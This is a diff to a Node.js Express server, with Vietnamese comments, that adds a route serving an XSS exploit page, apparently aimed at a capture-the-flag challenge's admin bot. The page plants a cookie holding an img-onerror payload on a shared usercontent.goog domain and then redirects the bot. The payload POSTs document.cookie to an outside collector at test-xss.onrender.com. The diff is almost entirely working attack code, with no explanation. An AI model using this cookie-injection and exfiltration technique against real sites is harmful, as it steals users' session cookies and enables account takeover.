@@ -211,6 +211,32 @@ app.get("/csrf-form", (req, res) => {
   res.send(html);
 });
 
+// Route chứa payload XSS để khai thác bot
+app.get("/xss.html", (req, res) => {
+  const html = `
+    <!DOCTYPE html>
+    <html>
+    <body>
+      <h1>💥 Bot đang bị khai thác...</h1>
+
+      <script>
+        // Ghi cookie chứa XSS payload lên domain hợp lệ
+        document.cookie = "password=<img src=x onerror='fetch(\\\`https://test-xss.onrender.com/stolen-data\\\`,{method:\\\`POST\\\`,body:document.cookie})'>; domain=.0ta1gxvglk52d7fsz3gyhr6q6t5go4jo6h7edetlj2yl4cpehlid-h641507400.scf.usercontent.goog; path=/";
+
+        // Redirect bot quay lại game để XSS được thực thi
+        setTimeout(() => {
+          location.href = "https://game-arcade-web.2024.ctfcompetition.com/#1";
+        }, 1000);
+      </script>
+    </body>
+    </html>
+  `;
+  res.setHeader("Content-Type", "text/html");
+  console.log("⚡ Gửi xss.html cho bot!");
+  res.send(html);
+});
+
+
 
   
 
